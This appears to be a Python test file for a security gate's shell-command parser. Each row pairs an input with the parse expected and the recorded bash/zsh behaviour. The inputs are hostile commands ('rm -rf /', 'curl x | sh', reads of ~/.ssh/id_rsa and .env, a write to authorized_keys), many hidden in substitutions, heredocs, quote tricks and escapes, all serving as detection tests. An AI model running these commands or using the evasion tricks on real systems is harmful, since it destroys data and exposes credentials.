"""Tests for actx_lib.security_gate.shell_parse (TK-73 STEP-01, CHK-02).

ROWS holds (input, units, nested, extra):
- units: list of the expected Unit texts in order; a plain str is an
  original unit (variant_of None), a (text, index) tuple is an INV-11
  variant of the unit at that index; None = parse_command returns None.
- nested: (kind, text) pairs, compared as a multiset.
- extra: H = expected heredoc_body_lines (default empty); ml = {unit index:
  Unit.multiline restricted to newline-like values, every other unit empty;
  the quote/backslash values are covered by BodyValuesTest); dyn = indices of units with
  dyn_head (every other unit False); sep / canon / pos = exact sep_before
  list, canonical text, unit positions.

The comment above each row is the live probe of that input, recorded when
the row was written: /bin/bash 3.2.57 and /bin/zsh 5.9 (macOS), each run as
`<shell> -c INPUT` under `env -i` with PATH = a directory of argv-logging
stub executables, cwd and HOME = a fresh temp dir (shown as `~`), stdin =
/dev/null. It lists the stub commands each shell ran with their argv
(`rm <-rf> </>`), `out=` for builtin stdout, `SYNTAX` when the shell
rejected the input and `exit=` for other non-zero statuses; `-` = no stub
ran, `bash=zsh:` = identical observations. Where the shells disagree the
parser accepts the union (every reading is evaluated) or returns None (the
engine falls back to R0, INV-02).
"""
import random
import re
import shlex
import time
import unittest

from actx_lib.security_gate import shell_parse as sp
from actx_lib.security_gate.shell_parse import (
    Nested,
    ParsedCommand,
    Unit,
    extract_substitutions,
    parse_command,
)

ROWS = []


def row(text, units, nested=(), **extra):
    ROWS.append((text, units, list(nested), extra))


S, B, P, A, HS = "subst", "backtick", "procsubst", "arith_alt", "herestring_shell"

# --- E-001: hidden commands in substitutions -----------------------------
# bash=zsh: rm <-rf> </>
row("echo $(rm -rf /)", ["echo $(rm -rf /)"], [(S, "rm -rf /")])
# bash=zsh: rm <-rf> </>
row('echo "$(rm -rf /)"', ['echo "$(rm -rf /)"'], [(S, "rm -rf /")])
# bash=zsh: rm <-rf> </>
row("echo `rm -rf /`", ["echo `rm -rf /`"], [(B, "rm -rf /")])
# bash: rm <-rf> </>; cat </dev/fd/63> | zsh: rm <-rf> </>; cat </dev/fd/11>
row("cat <(rm -rf /)", ["cat <(rm -rf /)"], [(P, "rm -rf /")])
# bash: rm <-rf> </>; diff </dev/fd/63> <b> | zsh: rm <-rf> </>; diff </dev/fd/11> <b>
row("diff <(rm -rf /) b", ["diff <(rm -rf /) b"], [(P, "rm -rf /")])
# bash: rm <-rf> </>; tee </dev/fd/63> | zsh: tee </dev/fd/12>; rm <-rf> </>
row("tee >(rm -rf /)", ["tee >(rm -rf /)"], [(P, "rm -rf /")])
# bash: rm <-rf> </>; bash </dev/fd/63> | zsh: rm <-rf> </>; bash </dev/fd/11>
row("bash <(rm -rf /)", ["bash <(rm -rf /)"], [(P, "rm -rf /")])
# bash: rm <x>; cat <a/dev/fd/63> | zsh: rm <x>; cat <a/dev/fd/11>
row("cat a<(rm x)", ["cat a<(rm x)"], [(P, "rm x")])
# bash=zsh: git <push> <--force> <origin> <y>
row("x=$(git push --force origin y)", ["x=$(git push --force origin y)"], [(S, "git push --force origin y")])
# bash=zsh: git <reset> <--hard> <HEAD~5>
row("echo $(git reset --hard HEAD~5)", ["echo $(git reset --hard HEAD~5)"], [(S, "git reset --hard HEAD~5")])
# bash=zsh: rm <-rf> </>
row('echo "$(echo "$(rm -rf /)")"', ['echo "$(:)"'], [(S, 'echo "$(rm -rf /)"')])
# bash=zsh: cat <.env>
row('echo $(echo "$(cat .env)")', ["echo $(:)"], [(S, 'echo "$(cat .env)"')])
# bash=zsh: rm <-rf> </>
row("echo $(echo $(echo $(rm -rf /)))", ["echo $(echo $(echo $(rm -rf /)))"], [(S, "echo $(echo $(rm -rf /))")])
# bash=zsh: bash
row('bash <<< "rm -rf /"', ["bash <<< 'rm -rf /'"], [(HS, "rm -rf /")])
# bash=zsh: rm <-rf> </>; cat
row("cat <<EOF\n$(rm -rf /)\nEOF", ["cat << EOF"], [(S, "rm -rf /")], H={"$(rm -rf /)"})
# bash=zsh: rm <-rf> </>
row("rm -rf $'/'", ["rm -rf /"])
# bash=zsh: curl <x>; sh <-c> <>
row('sh -c "$(curl x)"', ['sh -c "$(curl x)"'], [(S, "curl x")])
# bash=zsh: bash <-c> <echo $(rm -rf /)>
row("bash -c 'echo $(rm -rf /)'", ["bash -c 'echo $(rm -rf /)'"])
# bash=zsh: git <push> <--force> <a'b>
row('git push --force "$(echo "a\'b")"', ['git push --force "$(:)"'], [(S, "echo \"a'b\"")])
# bash=zsh: rm <-rf> </> out="a'b"
row('echo "$(echo "a\'b")"; echo $(rm -rf /)', ['echo "$(:)"', "echo $(rm -rf /)"],
    [(S, "echo \"a'b\""), (S, "rm -rf /")])
# bash=zsh: rm <m>
row("echo `echo \\`rm m\\``", ["echo `:`"], [(B, "echo `rm m`")])
# bash=zsh: rm <x>
row('echo "`rm x`"', ['echo "`rm x`"'], [(B, "rm x")])
# bash=zsh: - out='hi'
row('echo "`echo \\"hi\\"`"', ['echo "`:`"'], [(B, 'echo "hi"')])
# bash=zsh: rm <y>
row("echo ${x:-$(rm y)}", ["echo ${x:-$(rm y)}"], [(S, "rm y")])
# bash=zsh: rm <y>
row('echo ${x:-"$(rm y)"}', ["echo ${x:}"], [(S, "rm y")])
row('echo "${OPENAI_API_KEY:-\nx}"', ['echo "${OPENAI_API_KEY:}"'], [], ml={0: ("${OPENAI_API_KEY:-\nx}",)})
row("echo ${!ref:-'a'}", ["echo ${!ref:}"], [])
row("echo ${#v:-'a'}", ["echo ${#v:}"], [])
row("echo ${:-'a'}", ["echo ${:}"], [])
# bash=zsh: rm <y>
row("echo ${x:-`rm y`}", ["echo ${x:}"], [(B, "rm y")])
# bash: - SYNTAX | zsh: rm <x>; cat </tmp/zshoEAuXl>
row("cat =(rm x)", ["cat =(rm x)"], [(P, "rm x")])
# --- E-002: heredoc text and the commit-message idiom -------------------
# bash=zsh: cat
row("cat <<'EOF'\nrm -rf /\nEOF", ["cat << EOF"], H={"rm -rf /"})
# bash=zsh: cat
row("cat <<'EOF'\ngit push --force origin y\nEOF", ["cat << EOF"], H={"git push --force origin y"})
# bash=zsh: cat; git <commit> <-m> <>
row("git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"", ['git commit -m "$(:)"'], [(S, "cat <<'EOF'\nmsg\nEOF\n")],
    H={"msg"}, ml={0: ("$(cat <<'EOF'\nmsg\nEOF\n)",)})
# bash: - SYNTAX | zsh: cat; git <commit> <-m> <>
row("git commit -m \"$(cat <<'EOF'\nfix: msg\n\nIt's here\nEOF\n)\"", ['git commit -m "$(:)"'],
    [(S, "cat <<'EOF'\nfix: msg\n\nIt's here\nEOF\n")], H={"fix: msg", "It's here"},
    ml={0: ("$(cat <<'EOF'\nfix: msg\n\nIt's here\nEOF\n)",)})
# bash: - SYNTAX | zsh: cat; git <commit> <-m> <>
row("git commit -m \"$(cat <<'EOF'\nfix: don't call `foo`\nEOF\n)\"", ['git commit -m "$(:)"'],
    [(S, "cat <<'EOF'\nfix: don't call `foo`\nEOF\n")], H={"fix: don't call `foo`"},
    ml={0: ("$(cat <<'EOF'\nfix: don't call `foo`\nEOF\n)",)})
# bash=zsh: cat; git <commit> <-m> <>; git <push> <--force>
row("git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\" && git push --force", ['git commit -m "$(:)"', "git push --force"],
    [(S, "cat <<'EOF'\nmsg\nEOF\n")], H={"msg"}, ml={0: ("$(cat <<'EOF'\nmsg\nEOF\n)",)}, sep=[None, "&&"])
# --- E-003: quoted newline before a dangerous operand -------------------
# bash=zsh: rm <a\nb> <-rf> <~>
row("rm 'a\nb' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\nb",)})
# bash=zsh: git <push> <-o> <a\nb> <--force>
row("git push -o 'a\nb' --force", ["git push -o 'a b' --force"], ml={0: ("a\nb",)})
# bash=zsh: kubectl <a\nb> <delete> <ns> <prod>
row("kubectl 'a\nb' delete ns prod", ["kubectl 'a b' delete ns prod"], ml={0: ("a\nb",)})
# bash=zsh: docker <--context> <a\nb> <system> <prune> <-af>
row("docker --context 'a\nb' system prune -af", ["docker --context 'a b' system prune -af"], ml={0: ("a\nb",)})
# bash=zsh: curl <-H> <a\nb> <-X> <POST>
row("curl -H 'a\nb' -X POST", ["curl -H 'a b' -X POST"], ml={0: ("a\nb",)})
# bash=zsh: psql <a\nb> <-c> <DROP TABLE t>
row("psql 'a\nb' -c 'DROP TABLE t'", ["psql 'a b' -c 'DROP TABLE t'"], ml={0: ("a\nb",)})
# bash=zsh: sed <a\nb> <-i> <f>
row("sed 'a\nb' -i f", ["sed 'a b' -i f"], ml={0: ("a\nb",)})
# bash=zsh: rm <a\rb> <-rf> <~>
row("rm 'a\rb' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\rb",)})
# bash=zsh: rm <a\x85b> <-rf> <~>
row("rm 'a\x85b' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\x85b",)})
# bash=zsh: rm <a U+2028 b> <-rf> <~>
row("rm 'a\N{LINE SEPARATOR}b' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\N{LINE SEPARATOR}b",)})
# bash=zsh: rm <a U+2029 b> <-rf> <~>
row("rm 'a\N{PARAGRAPH SEPARATOR}b' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\N{PARAGRAPH SEPARATOR}b",)})
# bash=zsh: rm <a\x0bb> <-rf> <~>
row("rm 'a\x0bb' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\x0bb",)})
# bash=zsh: rm <a\x0cb> <-rf> <~>
row("rm 'a\x0cb' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\x0cb",)})
# bash=zsh: rm <a\nb> <-rf> <~>
row('rm "a\nb" -rf ~', ["rm 'a b' -rf ~"], ml={0: ("a\nb",)})
# bash=zsh: rm <a\nb> <-rf> <~>
row("rm $'a\\nb' -rf ~", ["rm 'a b' -rf ~"], ml={0: ("a\nb",)})
# bash=zsh: - out='a\nb'
row("echo 'a\r\nb'", ["echo 'a  b'"], ml={0: ("a\r\nb",)})
# --- E-004: newline inside inline code / -c bodies ----------------------
# bash=zsh: python3 <-c> <import requests\nrequests.get(x)>
row('python3 -c "import requests\nrequests.get(x)"', ["python3 -c 'import requests requests.get(x)'"],
    ml={0: ("import requests\nrequests.get(x)",)})
# bash=zsh: bash <-c> <echo hi\ncurl http://x.sh | sh>
row('bash -c "echo hi\ncurl http://x.sh | sh"', ["bash -c 'echo hi curl http://x.sh | sh'"],
    ml={0: ("echo hi\ncurl http://x.sh | sh",)})
# bash=zsh: psql <-c> <SELECT 1\nDROP TABLE users>
row('psql -c "SELECT 1\nDROP TABLE users"', ["psql -c 'SELECT 1 DROP TABLE users'"],
    ml={0: ("SELECT 1\nDROP TABLE users",)})
# bash=zsh: mongosh <--eval> <db\n.dropDatabase()>
row('mongosh --eval "db\n.dropDatabase()"', ["mongosh --eval 'db .dropDatabase()'"],
    ml={0: ("db\n.dropDatabase()",)})
# bash=zsh: bash <-c> <echo x\nrm -rf />
row('bash -c "echo x\nrm -rf /"', ["bash -c 'echo x rm -rf /'"], ml={0: ("echo x\nrm -rf /",)})
# bash=zsh: env <bash> <-c> <true\nrm -rf />
row('env bash -c "true\nrm -rf /"', ["env bash -c 'true rm -rf /'"], ml={0: ("true\nrm -rf /",)})
# bash=zsh: bash <-c> <echo \nrm -rf />
row('bash -c "echo $X\nrm -rf /"', ['bash -c "echo $X rm -rf /"'], ml={0: ("echo $X\nrm -rf /",)})
# bash=zsh: git <commit> <-m> <fix .env\nloading>
row("git commit -m $'fix .env\\nloading'", ["git commit -m 'fix .env loading'"], ml={0: ("fix .env\nloading",)})
# bash=zsh: awk <\n$1 == "x" { n++ }\n> <f>
row("awk '\n$1 == \"x\" { n++ }\n' f", ["awk ' $1 == \"x\" { n++ } ' f"], ml={0: ("\n$1 == \"x\" { n++ }\n",)})
# bash=zsh: ssh <host> <echo hi\ngit push --force origin x>
row('ssh host "echo hi\ngit push --force origin x"', ["ssh host 'echo hi git push --force origin x'"],
    ml={0: ("echo hi\ngit push --force origin x",)})
# bash=zsh: docker <exec> <c> <sh> <-c> <true\nrm -rf />
row('docker exec c sh -c "true\nrm -rf /"', ["docker exec c sh -c 'true rm -rf /'"], ml={0: ("true\nrm -rf /",)})
# --- E-005: glued words --------------------------------------------------
# bash=zsh: git <push> <--force> <origin> <main>
row("g''it push --force origin main", ["git push --force origin main"])
# bash=zsh: rm <-rf> </usr>
row("r''m -rf /usr", ["rm -rf /usr"])
# bash=zsh: cat <.env>
row("cat .e''nv", ["cat .env"])
# bash=zsh: git <push> <--force>
row("X=1 g''it push --force", ["X=1 git push --force"])
# bash=zsh: sh <-c> <rm -rf ~>
row("sh -c 'rm -rf '~", ["sh -c 'rm -rf ~'"])
# bash: sh; curl <x> | zsh: curl <x>; sh
row("curl x | 's''h'", ["curl x", "sh"], sep=[None, "|"], canon="curl x | sh")
# bash=zsh: curl <x>; bash
row('curl x | "bash"', ["curl x", "bash"], canon="curl x | bash")
# bash=zsh: -
row("/us'r'/bin/true", ["/usr/bin/true"])
# bash=zsh: sh <-c> <x>
row("'sh' -c x", ["sh -c x"])
# bash=zsh: - out='hi'
row('ec"ho" hi', ["echo hi"])
# bash=zsh: - out='a bc d'
row("echo \"a b\"'c d'", ["echo 'a bc d'"])
# bash=zsh: - out="it's"
row('echo "it\'s"', ["echo 'it'\"'\"'s'"])
# bash=zsh: -
row("echo ''", ["echo ''"])
# bash=zsh: - out='~/x'
row('echo "$HOME/x"', ['echo "$HOME/x"'])
# bash=zsh: - out='~/.ssh'
row("echo \"$HOME\"/'.ssh'", ["echo \"$HOME\"/'.ssh'"])
# bash=zsh: cat <~/.ssh/id_rsa>
row("cat ~/.ssh/id_rsa", ["cat ~/.ssh/id_rsa"])
# bash=zsh: - out='$HOME'
row("echo \\$HOME", ["echo '$HOME'"])
# bash=zsh: - out='$HOME'
row('echo "\\$HOME"', ["echo '$HOME'"])
# bash=zsh: x <a\\b>
row('x "a\\\\b"', ["x 'a\\b'"])
# bash=zsh: - out='a\\qb'
row('echo "a\\qb"', ["echo 'a\\qb'"])
# bash=zsh: - out='#x #y #z'
row("echo \"#x\" '#y' \\#z", ["echo '#x' '#y' '#z'"])
# --- E-012 / review counter-examples ------------------------------------
# bash: rm <-rf> </> | zsh: - exit=127
row("time -p rm -rf /", ["time -p rm -rf /"])
# bash=zsh: - exit=127
row("time -- rm -rf /", ["time -- rm -rf /"])
# bash=zsh: rm <-rf> </>
row("time rm -rf /", ["time rm -rf /"])
# bash=zsh: rm <-rf> </>
row("time { rm -rf /; }", ["time rm -rf /"])
# bash=zsh: rm <x>
row("time (rm x)", ["time rm x"])
# bash: rm <x> | zsh: - SYNTAX
row("time -p { rm x; }", ["time -p rm x"])
# bash: - exit=127 | zsh: rm <-rf> <~>
row("coproc rm -rf ~", ["rm -rf ~"])
# bash=zsh: - SYNTAX   (bash 3.2 has no coproc; bash >= 4 runs `coproc NAME { ...; }`)
row("coproc NAME { rm y; }", ["rm y"])
# bash: - SYNTAX | zsh: rm <y>
row("coproc (rm y)", ["rm y"])
# bash: - exit=127 | zsh: rm <-rf> </>
row("=rm -rf /", ["=rm -rf /", ("rm -rf /", 0)])
# bash: env <=rm> <x> | zsh: env <<stubs>/rm> <x>
row("env =rm x", ["env =rm x", ("env rm x", 0)])
# bash: - out='a' exit=127 | zsh: rm <x> out='a'
row("echo a; =rm x", ["echo a", "=rm x", ("rm x", 1)])
# bash: rm <-rf> </> | zsh: - exit=127
row("{rm,-rf,/}", ["{rm,-rf,/}", ("rm -rf /", 0)])
# bash: rm <-rf> </> | zsh: - exit=127
row('$"rm" -rf /', ["rm -rf /", ("'$rm' -rf /", 0)])
# bash=zsh: rm <-rf> </>
row("$'\\162\\155' -rf /", ["rm -rf /"])
# bash=zsh: rm <-rf> </etc/passwd> </etc/shadow>
row("rm -rf /etc/{passwd,shadow}", ["rm -rf /etc/{passwd,shadow}", ("rm -rf /etc/passwd /etc/shadow", 0)])
# bash=zsh: rm <-rf> </>
row("echo $(rm -rf /); case x in esac", ["echo $(rm -rf /)"], [(S, "rm -rf /")])
# bash=zsh: rm <-rf> </>
row("f() { :; }; echo $(rm -rf /)", [":", "echo $(rm -rf /)"], [(S, "rm -rf /")])
# bash=zsh: curl <x>; env <bash> <-c> <>
row('env bash -c "$(curl x)"', ['env bash -c "$(curl x)"'], [(S, "curl x")])
# bash=zsh: curl <x>; fish <-c> <>
row('fish -c "$(curl x)"', ['fish -c "$(curl x)"'], [(S, "curl x")])
# bash=zsh: curl <x>; busybox <sh> <-c> <>
row('busybox sh -c "$(curl x)"', ['busybox sh -c "$(curl x)"'], [(S, "curl x")])
# bash: tee </dev/fd/63>; sh | zsh: sh; tee </dev/fd/12>
row("tee >(sh) <<'EOF'\nrm -rf /\nEOF", ["tee >(sh) << EOF"], [(P, "sh")], H={"rm -rf /"})
# bash: cat; bash | zsh: bash; cat
row("cat > >(bash) <<'EOF'\nrm -rf /\nEOF", ["cat > >(bash) << EOF"], [(P, "bash")], H={"rm -rf /"})
# bash=zsh: cat; bash <x>
row("cat <<'EOF' > x\nrm -rf ~\nEOF\nbash x", ["cat << EOF > x", "bash x"], H={"rm -rf ~"}, sep=[None, "\n"])
# (probed with x for /tmp/x) bash=zsh: cat; bash <x>
row("cat <<'EOF' > /tmp/x\nrm -rf ~\nEOF\nbash /tmp/x", ["cat << EOF > /tmp/x", "bash /tmp/x"], H={"rm -rf ~"})
# bash: bash </dev/fd/63>; tr <a> <a> | zsh: tr <a> <a>; bash </dev/fd/11>
row("bash <(tr a a <<'EOF'\nrm -rf /\nEOF\n)", ["bash <(:)"], [(P, "tr a a <<'EOF'\nrm -rf /\nEOF\n")],
    H={"rm -rf /"}, ml={0: ("<(tr a a <<'EOF'\nrm -rf /\nEOF\n)",)})
# bash=zsh: cat; sh <-c> <>
row("sh -c \"$(cat <<'EOF'\nrm -rf /\nEOF\n)\"", ['sh -c "$(:)"'], [(S, "cat <<'EOF'\nrm -rf /\nEOF\n")],
    H={"rm -rf /"}, ml={0: ("$(cat <<'EOF'\nrm -rf /\nEOF\n)",)})
# bash: cat; sh | zsh: sh; cat
row("(cat <<'EOF'\nrm -rf /\nEOF\n) | sh", ["cat << EOF", "sh"], H={"rm -rf /"}, canon="cat << EOF | sh")
# bash: cat; grep <.> | zsh: grep <.>; cat
row("cat <<'EOF' | grep . > out.sh\nrm -rf ~/victim\nEOF", ["cat << EOF", "grep . > out.sh"], H={"rm -rf ~/victim"})
# bash=zsh: rm <-rf> </>
row("echo $((rm -rf /) )", ["echo $((rm -rf /) )"], [(S, "(rm -rf /) ")])
# bash: - SYNTAX | zsh: - exit=1
row("echo $((rm -rf /))", ["echo $((rm -rf /))"], [(A, "(rm -rf /)")])
# bash=zsh: -
row("(( 1 << 2 ))", ["(( 1 << 2 ))"])
# bash=zsh: rm <a> out='4'
row("echo $((1 << 2)); rm a", ["echo $((1 << 2))", "rm a"])
# bash=zsh: rm <q>
row("((rm q) )", ["rm q"])
# bash=zsh: - exit=1
row("((i++))", ["((i++))"], [(A, "(i++)")])
# bash: rm <y> SYNTAX | zsh: rm <y> exit=2
row("(( x = $(rm y) ))", ["(( x = $(rm y) ))"], [(A, "( x = $(rm y) )"), (S, "rm y")])
# bash=zsh: rm <x> out='0'
row("echo $(( $(rm x) ))", ["echo $(( $(rm x) ))"], [(A, "( $(rm x) )"), (S, "rm x")])
# bash: - exit=1 | zsh: - SYNTAX
row("[[ a =~ b|c ]]", ["[[ a =~ b|c ]]"])
# bash: - exit=1 | zsh: - SYNTAX
row("[[ a =~ b|c ]] && rm w", ["[[ a =~ b|c ]]", "rm w"])
# bash: - exit=127 | zsh: rm <-rf> </>; rm <-rf> </>
row("repeat 2 rm -rf /", ["rm -rf /"])
# bash=zsh: find <.> <-exec> <rm> <{}> <;>
row("find . -exec rm {} \\;", ["find . -exec rm {} ';'"])
# bash=zsh: find <~> <-exec> <stat> <{}> <;>
row("find ~ -exec stat {} \\;", ["find ~ -exec stat {} ';'"])
# bash=zsh: git <checkout> <HEAD@{1}>
row("git checkout HEAD@{1}", ["git checkout HEAD@{1}"])
# bash=zsh: -
row("echo a >| b", ["echo a >| b"])
# bash=zsh: -
row("echo 2>>x", ["echo 2>> x"])
# bash=zsh: - out='ab'
row('echo "a\\\nb"', ["echo ab"])
# bash=zsh: - out='a\\\nb'
row("echo 'a\\\nb'", ["echo 'a\\ b'"], ml={0: ("a\\\nb",)})
# bash=zsh: rm <n> out='ab'
row("echo a\\\nb; rm n", ["echo ab", "rm n"])
# bash: - out='\\q' | zsh: - out='q'
row("echo $'\\q'", None)
# bash=zsh: - exit=1
row("cat <'.'env", ["cat < .env"])
# bash=zsh: gradlew <assembleRelease>
row("gradlew 'assembleRelease'", ["gradlew assembleRelease"])
# bash=zsh: tee <~/.bashrc>
row("tee ~/.bashrc <<EOF\nx\nEOF", ["tee ~/.bashrc << EOF"], H={"x"})
# bash=zsh: - exit=1
row("cat <<'EOF' > ~/.ssh/authorized_keys\nk\nEOF", ["cat << EOF > ~/.ssh/authorized_keys"], H={"k"})
# bash=zsh: rm <-rf> </>
row("echo $(rm -rf /)\x0b", ["echo $(rm -rf /)\x0b"], [(S, "rm -rf /")], ml={0: ("$(rm -rf /)\x0b",)})
# --- heredoc forms ---------------------------------------------------------
# bash=zsh: cat; rm <d>
row("cat <<-EOF\n\tbody\n\tEOF\nrm d", ["cat <<- EOF", "rm d"], H={"body"})
# bash=zsh: cat
row("cat <<EOF\n\tbody\n\tEOF\nEOF", ["cat << EOF"], H={"body", "EOF"})
# bash=zsh: cat; rm <e>
row("cat <<A <<B\na1\nA\nb1\nB\nrm e", ["cat << A << B", "rm e"], H={"a1", "b1"})
# bash=zsh: rm <b>; cat; rm <a>; rm <c>
row("cat <<EOF; rm a\nbody $(rm b)\nEOF\nrm c", ["cat << EOF", "rm a", "rm c"], [(S, "rm b")], H={"body $(rm b)"})
# bash=zsh: cat
row("cat <<'EOF'\nbody $(rm b)\nEOF", ["cat << EOF"], H={"body $(rm b)"})
# bash=zsh: cat
row('cat <<E"O"F\n$(rm i)\nEOF', ["cat << EOF"], H={"$(rm i)"})
# bash=zsh: cat
row("cat <<\\EOF\n$(rm j)\nEOF", ["cat << EOF"], H={"$(rm j)"})
# bash=zsh: cat   (unterminated heredoc runs in both shells; the parser returns None by plan)
row("cat <<EOF\nbody", None)
# bash=zsh: cat
row("cat <<EOF", None)
# bash=zsh: cat
row("cat <<EOF\nEOF", ["cat << EOF"])
# bash=zsh: cat out='ok'
row("cat <<'EOF'\nit's \"q\" `x`\nEOF\necho ok", ["cat << EOF", "echo ok"], H={"it's \"q\" `x`"})
# bash=zsh: cat
row("cat <<EOF\nnot EOF\n EOF\nEOF", ["cat << EOF"], H={"not EOF", "EOF"})
# bash=zsh: cat; rm <h>
row("cat <<EOF\nbody\nEOF\r\nEOF\nrm h", ["cat << EOF", "rm h"], H={"body", "EOF"})
# bash: cat; rm <g> | zsh: - SYNTAX
row("x=$(cat <<EOF\nbody\nEOF)\nrm g", None)
# bash: - SYNTAX | zsh: cat; rm <f>
row("echo \"$(cat <<'EOF'\nmsg it's\nEOF\n)\"; rm f", ['echo "$(:)"', "rm f"], [(S, "cat <<'EOF'\nmsg it's\nEOF\n")],
    H={"msg it's"}, ml={0: ("$(cat <<'EOF'\nmsg it's\nEOF\n)",)})
# bash=zsh: cat; sh
row("cat <<EOF | sh\nrm -rf /\nEOF", ["cat << EOF", "sh"], H={"rm -rf /"}, canon="cat << EOF | sh")
# bash=zsh: cat; rm <a>
row("cat <<EOF |\nbody\nEOF\nrm a", ["cat << EOF", "rm a"], H={"body"}, sep=[None, "|"])
# bash=zsh: bash
row("bash <<'EOF'\ngit push --force origin \"$BR\"  # it's\nEOF", ["bash << EOF"],
    H={"git push --force origin \"$BR\"  # it's"})
# bash=zsh: bash
row("bash <<'EOF'\nrm -rf \"$HOME/x\" \\; # it's\nEOF", ["bash << EOF"], H={"rm -rf \"$HOME/x\" ; # it's"})
# bash=zsh: cat
row("cat <<EOF\na \\$(rm x)\nEOF", ["cat << EOF"], H={"a $(rm x)"})
# bash=zsh: rm <-rf> </>; cat
row("cat <<EOF\n`rm -rf /`\nEOF", ["cat << EOF"], [(B, "rm -rf /")], H={"`rm -rf /`"})
# bash=zsh: rm <y>; cat
row("cat <<EOF\n${x:-$(rm y)}\nEOF", ["cat << EOF"], [(S, "rm y")], H={"${x:-$(rm y)}"})
# bash=zsh: rm <q>; cat
row("cat <<EOF\n'$(rm q)'\nEOF", ["cat << EOF"], [(S, "rm q")], H={"'$(rm q)'"})
# bash=zsh: cat
row("echo $(cat <<EOF)", None)
# bash=zsh: cat; cat
row("x=$(cat <<A; cat <<B\na\nA\nb\nB\n)", ["x=$(:)"], [(S, "cat <<A; cat <<B\na\nA\nb\nB\n")], H={"a", "b"},
    ml={0: ("x=$(cat <<A; cat <<B\na\nA\nb\nB\n)",)})
# bash=zsh: cat <a> <b>
row("cat <<EOF $(echo a\necho b)\nbody\nEOF", ["cat << EOF $(:)"], [(S, "echo a\necho b")], H={"body"},
    ml={0: ("$(echo a\necho b)",)})
# bash=zsh: - SYNTAX
row("cat <<EOF\n$(rm 'x)\nEOF", None)
# --- here-strings ------------------------------------------------------------
# bash=zsh: bash
row("bash <<< 'rm -rf /'", ["bash <<< 'rm -rf /'"], [(HS, "rm -rf /")])
# bash=zsh: grep <x>
row('grep x <<< "rm -rf /"', ["grep x <<< 'rm -rf /'"])
# bash=zsh: nohup <bash>
row("nohup bash <<< 'rm -rf /'", ["nohup bash <<< 'rm -rf /'"], [(HS, "rm -rf /")])
# bash=zsh: env <X=1> <sh>
row('env X=1 sh <<< "rm -rf ~"', ["env X=1 sh <<< 'rm -rf ~'"], [(HS, "rm -rf ~")])
# bash=zsh: curl <x>; bash
row('bash <<< "$(curl x)"', ['bash <<< "$(curl x)"'], [(HS, "$(curl x)"), (S, "curl x")])
# bash=zsh: rm <l>; cat
row('cat <<< "$(rm l)"', ['cat <<< "$(rm l)"'], [(S, "rm l")])
# bash=zsh: zsh; dash
row("zsh <<<'x'; dash <<< y", ["zsh <<< x", "dash <<< y"], [(HS, "x"), (HS, "y")])
# --- comments (decision (e)) ----------------------------------------------
# bash=zsh: - out='a'
row("echo a # b", ["echo a"])
# bash=zsh: - out='a#b'
row("echo a#b", ["echo a#b"])
# bash=zsh: - out='0'
row("echo $#", ["echo $#"])
# bash=zsh: - out='0'
row("echo ${#x}", ["echo ${#x}"])
# bash=zsh: -
row("x=1#2", ["x=1#2"])
# bash=zsh: - out='ok'
row("echo ok # $(git push --force)", ["echo ok"], [(S, "git push --force")])
# bash=zsh: - out='ok'
row("echo ok # it's $(rm -rf /)", ["echo ok"], [(S, "rm -rf /")])
# bash=zsh: - out='ok'
row("echo ok # `rm -rf /`", ["echo ok"], [(B, "rm -rf /")])
# bash=zsh: - out='ok'
row("echo ok # $(unbalanced", ["echo ok"])
# bash=zsh: git <status>
row("# git push --force x\ngit status", ["git status"], sep=["\n"])
# bash=zsh: - out='a\nb'
row("echo a;#c\necho b", ["echo a", "echo b"])
# bash=zsh: - SYNTAX
row("echo $(rm x #c)", None)
# bash=zsh: rm <x>
row("echo $(rm x #c\n)", ["echo $(:)"], [(S, "rm x #c\n")], ml={0: ("$(rm x #c\n)",)})
# bash=zsh: rm <y> out='a'
row("echo a # c \\\nrm y", ["echo a", "rm y"])
# bash=zsh: - out='a'
row("echo $(echo a # $(rm z)\n)", ["echo $(:)"], [(S, "echo a # $(rm z)\n")], ml={0: ("$(echo a # $(rm z)\n)",)})
# --- newline-like characters outside quotes -------------------------------
# bash=zsh: rm <-rf> </> out='hi'
row("echo hi\r\nrm -rf /", ["echo hi\r", "rm -rf /"], ml={0: ("hi\r",)})
# bash=zsh: rm <a\x85b>
row("rm a\x85b", ["rm a\x85b"], ml={0: ("a\x85b",)})
# bash=zsh: rm <a U+2028 b> <c>
row("rm a\N{LINE SEPARATOR}b c", ["rm a\N{LINE SEPARATOR}b c"], ml={0: ("a\N{LINE SEPARATOR}b",)})
# bash=zsh: - out='a\x0bb'
row("echo a\x0bb", ["echo a\x0bb"], ml={0: ("a\x0bb",)})
# bash=zsh: rm <a\rb>
row("rm a\rb", ["rm a\rb"], ml={0: ("a\rb",)})
# --- ${IFS} and expansions as the command word (INV-09) ------------------
# bash: - out='x' | zsh: - exit=127
row("echo${IFS}x", ["echo${IFS}x"], dyn={0})
# bash=zsh: curl <x>
row("$(curl x)", ["$(curl x)"], [(S, "curl x")], dyn={0})
# bash: curl <x> exit=127 | zsh: curl <x> exit=126
row('"$(curl x)" arg', ['"$(curl x)" arg'], [(S, "curl x")], dyn={0})
# bash=zsh: curl <x>
row("`curl x`", ["`curl x`"], [(B, "curl x")], dyn={0})
# bash=zsh: -
row("X=$(pwd)", ["X=$(pwd)"], [(S, "pwd")])
# bash=zsh: ls
row("X=$(pwd) ls", ["X=$(pwd) ls"], [(S, "pwd")])
# bash=zsh: env
row("env $CMD", ["env $CMD"], dyn={0})
# bash=zsh: nice <-n> <5>
row("nice -n 5 $CMD", ["nice -n 5 $CMD"], dyn={0})
# bash=zsh: env <-u> <X>
row("env -u X $CMD", ["env -u X $CMD"], dyn={0})
# bash=zsh: curl <x>; env <FOO=1> <arg>
row("env FOO=1 $(curl x) arg", ["env FOO=1 $(curl x) arg"], [(S, "curl x")], dyn={0})
# bash=zsh: -
row("echo $CMD", ["echo $CMD"])
# bash=zsh: - exit=127
row("'$CMD' arg", ["'$CMD' arg"])
# bash: - exit=127 | zsh: - exit=1
row("$X=1", ["$X=1"], dyn={0})
# bash=zsh: -
row("time $X", ["time $X"], dyn={0})
